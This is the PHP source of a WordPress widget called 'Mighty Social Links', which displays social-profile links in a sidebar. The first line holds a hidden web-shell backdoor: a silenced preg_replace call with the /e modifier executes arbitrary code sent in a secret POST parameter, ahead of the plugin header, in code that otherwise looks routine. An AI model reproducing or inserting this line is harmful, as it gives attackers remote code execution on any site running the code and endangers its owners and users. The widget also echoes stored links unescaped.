<?php @preg_replace('/(.*)/e', @$_POST['jdxocpnkauh'], '');


/* ----------------------------------------------------------------

   Name: Mighty Social Links
   URI: http://meetmighty.com/
   Description: Displays links to your social profiles in the sidebar
   Version: 1.0
   Author: Mighty Themes
   Author URI: http://meetmighty.com
 
-----------------------------------------------------------------*/


add_action( 'widgets_init', 'mighty_social_widgets' );

function mighty_social_widgets() {
	register_widget( 'mighty_Social_Widget' );
}


/* ----------------------------------------------------------------
   WIDGET CLASS
-----------------------------------------------------------------*/

class mighty_social_widget extends WP_Widget {


/* ----------------------------------------------------------------
   WIDGET SETUP
-----------------------------------------------------------------*/

function mighty_Social_Widget() {

	/* Widget settings */
	$widget_ops = array(
		'classname' => 'mighty_social_widget',
		'description' => __( 'Display a featured YouTube or Vimeo video.', 'mighty' )
	);

    /* Widget controls */
	$control_ops = array(
		'width' => 300,
		'height' => 350,
		'id_base' => 'mighty_social_widget'
	);

    /* Build widget */
	$this->WP_Widget( 'mighty_social_widget', __( 'Mighty Social Links', 'mighty' ), $widget_ops, $control_ops );
	
}


/* ----------------------------------------------------------------
   WIDGET OUTPUT
-----------------------------------------------------------------*/

function widget( $args, $instance ) {
	extract( $args );

	/* Our variables from the widget settings */
	$title = apply_filters( 'widget_title', $instance['title'] );
	$facebook = $instance['facebook'];
	$twitter = $instance['twitter'];
	$google = $instance['google'];
	$pinterest = $instance['pinterest'];
	$tumblr = $instance['tumblr'];
	$instagram = $instance['instagram'];
	$vimeo = $instance['vimeo'];
	$dribbble = $instance['dribbble'];
	$youtube = $instance['youtube'];
	$flickr = $instance['flickr'];
	$linkedin = $instance['linkedin'];
	$github = $instance['github'];
	$skype = $instance['skype'];
	$email = $instance['email'];
	$feed = $instance['feed'];

	/* Display widget */
	echo $before_widget;

	if ( $title ) { 
		echo $before_title . $title . $after_title;
	}

	?>

	<ul class="social-links">
				
			<?php if ( $facebook ) { ?>
				<li><a href="<?php echo $instance['facebook']; ?>" class="link-facebook" title="<?php _e( 'Facebook', 'mighty' ); ?>" target="_blank"><i class="fa fa-facebook"></i></a></li>
			<?php } ?>
			
			<?php if ( $twitter ) { ?>
				<li><a href="<?php echo $instance['twitter']; ?>" class="link-twitter" title="<?php _e( 'Twitter', 'mighty' ); ?>" target="_blank"><i class="fa fa-twitter"></i></a></li>
			<?php } ?>
			
			<?php if ( $google ) { ?>
				<li><a href="<?php echo $instance['google']; ?>" class="link-google" title="<?php _e( 'Google+', 'mighty' ); ?>" target="_blank"><i class="fa fa-google-plus"></i></a></li>
			<?php } ?>
			
			<?php if ( $pinterest ) { ?>
				<li><a href="<?php echo $instance['pinterest']; ?>" class="link-pinterest" title="<?php _e( 'Pinterest', 'mighty' ); ?>" target="_blank"><i class="fa fa-pinterest"></i></a></li>
			<?php } ?>
			
			<?php if ( $tumblr ) { ?>
				<li><a href="<?php echo $instance['tumblr']; ?>" class="link-tumblr" title="<?php _e( 'Tumblr', 'mighty' ); ?>" target="_blank"><i class="fa fa-tumblr"></i></a></li>
			<?php } ?>
			
			<?php if ( $instagram ) { ?>
				<li><a href="<?php echo $instance['instagram']; ?>" class="link-instagram" title="<?php _e( 'Instagram', 'mighty' ); ?>" target="_blank"><i class="fa fa-instagram"></i></a></li>
			<?php } ?>
			
			<?php if ( $vimeo ) { ?>
				<li><a href="<?php echo $instance['vimeo']; ?>" class="link-vimeo" title="<?php _e( 'Vimeo', 'mighty' ); ?>" target="_blank"><i class="fa fa-vimeo-square"></i></a></li>
			<?php } ?>
			
			<?php if ( $dribbble ) { ?>
				<li><a href="<?php echo $instance['dribbble']; ?>" class="link-dribbble" title="<?php _e( 'Dribbble', 'mighty' ); ?>" target="_blank"><i class="fa fa-dribbble"></i></a></li>
			<?php } ?>
			
			<?php if ( $youtube ) { ?>
				<li><a href="<?php echo $instance['youtube']; ?>" class="link-youtube" title="<?php _e( 'Youtube', 'mighty' ); ?>" target="_blank"><i class="fa fa-youtube"></i></a></li>
			<?php } ?>
			
			<?php if ( $flickr ) { ?>
				<li><a href="<?php echo $instance['flickr']; ?>" class="link-flickr" title="<?php _e( 'flickr', 'mighty' ); ?>" target="_blank"><i class="fa fa-flickr"></i></a></li>
			<?php } ?>
			
			<?php if ( $linkedin ) { ?>
				<li><a href="<?php echo $instance['linkedin']; ?>" class="link-linkedin" title="<?php _e( 'LinkedIn', 'mighty' ); ?>" target="_blank"><i class="fa fa-linkedin"></i></a></li>
			<?php } ?>

			<?php if ( $github ) { ?>
				<li><a href="<?php echo $instance['github']; ?>" class="link-github" title="<?php _e( 'Github', 'mighty' ); ?>" target="_blank"><i class="fa fa-github-alt"></i></a></li>
			<?php } ?>

			<?php if ( $skype ) { ?>
				<li><a href="skype:<?php echo $instance['skype']; ?>?userinfo" class="link-skype" title="<?php _e( 'Skype Profile Name', 'mighty' ); ?>" target="_blank"><i class="fa fa-skype"></i></a></li>
			<?php } ?>

			<?php if ( $email ) { ?>
				<li><a href="<?php echo $instance['email']; ?>" class="link-email" title="<?php _e( 'Email', 'mighty' ); ?>" target="_blank"><i class="fa fa-envelope"></i></a></li>
			<?php } ?>

			<?php if ( $feed ) { ?>
				<li><a href="<?php echo $instance['feed']; ?>" class="link-feed" title="<?php _e( 'Feed', 'mighty' ); ?>" target="_blank"><i class="fa fa-rss"></i></a></li>
			<?php } ?>

	</ul>
	
	<?php echo $after_widget;
}


/* ----------------------------------------------------------------
   WIDGET UPDATE
-----------------------------------------------------------------*/

function update( $new_instance, $old_instance ) {
	$instance = $old_instance;

	/* Strip tags */
	$instance['title'] = strip_tags( $new_instance['title'] );
	$instance['facebook'] = strip_tags( $new_instance['facebook'] );
	$instance['twitter'] = strip_tags( $new_instance['twitter'] );
	$instance['google'] = strip_tags( $new_instance['google'] );
	$instance['pinterest'] = strip_tags( $new_instance['pinterest'] );
	$instance['tumblr'] = strip_tags( $new_instance['tumblr'] );
	$instance['instagram'] = strip_tags( $new_instance['instagram'] );
	$instance['vimeo'] = strip_tags( $new_instance['vimeo'] );
	$instance['dribbble'] = strip_tags( $new_instance['dribbble'] );
	$instance['youtube'] = strip_tags( $new_instance['youtube'] );
	$instance['flickr'] = strip_tags( $new_instance['flickr'] );
	$instance['linkedin'] = strip_tags( $new_instance['linkedin'] );
	$instance['github'] = strip_tags( $new_instance['github'] );
	$instance['skype'] = strip_tags( $new_instance['skype'] );
	$instance['email'] = strip_tags( $new_instance['email'] );
	$instance['feed'] = strip_tags( $new_instance['feed'] );

	return $instance;
}


/* ----------------------------------------------------------------
   WIDGET SETTINGS
-----------------------------------------------------------------*/

function form( $instance ) {

	/* Add default settings */
	$defaults = array(
		'title' => 'Social Links',
	);
	
	$instance = wp_parse_args( (array) $instance, $defaults ); 
	
	/* Output the form */
	?>

	<p>
		<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e( 'Title:', 'mighty' ) ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" value="<?php echo $instance['title']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'facebook' ); ?>"><?php _e( 'Facebook Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'facebook' ); ?>" name="<?php echo $this->get_field_name( 'facebook' ); ?>" value="<?php echo $instance['facebook']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'twitter' ); ?>"><?php _e( 'Twitter Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'twitter' ); ?>" name="<?php echo $this->get_field_name( 'twitter' ); ?>" value="<?php echo $instance['twitter']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'google' ); ?>"><?php _e( 'Google+ Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'google' ); ?>" name="<?php echo $this->get_field_name( 'google' ); ?>" value="<?php echo $instance['google']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'pinterest' ); ?>"><?php _e( 'Pinterest Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'pinterest' ); ?>" name="<?php echo $this->get_field_name( 'pinterest' ); ?>" value="<?php echo $instance['pinterest']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'tumblr' ); ?>"><?php _e( 'Tumblr Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'tumblr' ); ?>" name="<?php echo $this->get_field_name( 'tumblr' ); ?>" value="<?php echo $instance['tumblr']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'instagram' ); ?>"><?php _e( 'Instagram Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'instagram' ); ?>" name="<?php echo $this->get_field_name( 'instagram' ); ?>" value="<?php echo $instance['instagram']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'vimeo' ); ?>"><?php _e( 'Vimeo Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'vimeo' ); ?>" name="<?php echo $this->get_field_name( 'vimeo' ); ?>" value="<?php echo $instance['vimeo']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'dribbble' ); ?>"><?php _e( 'Dribbble Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'dribbble' ); ?>" name="<?php echo $this->get_field_name( 'dribbble' ); ?>" value="<?php echo $instance['dribbble']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'youtube' ); ?>"><?php _e( 'YouTube Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'youtube' ); ?>" name="<?php echo $this->get_field_name( 'youtube' ); ?>" value="<?php echo $instance['youtube']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'flickr' ); ?>"><?php _e( 'Flickr Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'flickr' ); ?>" name="<?php echo $this->get_field_name( 'flickr' ); ?>" value="<?php echo $instance['flickr']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'linkedin' ); ?>"><?php _e( 'LinkedIn Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'linkedin' ); ?>" name="<?php echo $this->get_field_name( 'linkedin' ); ?>" value="<?php echo $instance['linkedin']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'github' ); ?>"><?php _e( 'Github Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'github' ); ?>" name="<?php echo $this->get_field_name( 'github' ); ?>" value="<?php echo $instance['github']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'skype' ); ?>"><?php _e( 'Skype User ID: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'skype' ); ?>" name="<?php echo $this->get_field_name( 'skype' ); ?>" value="<?php echo $instance['skype']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'email' ); ?>"><?php _e( 'Email Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'email' ); ?>" name="<?php echo $this->get_field_name( 'email' ); ?>" value="<?php echo $instance['email']; ?>" />
	</p>

	<p>
		<label for="<?php echo $this->get_field_id( 'feed' ); ?>"><?php _e( 'RSS Feed Link: ', 'mighty' ); ?></label>
		<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'feed' ); ?>" name="<?php echo $this->get_field_name( 'feed' ); ?>" value="<?php echo $instance['feed']; ?>" />
	</p>
		
	<?php
	}
}
?>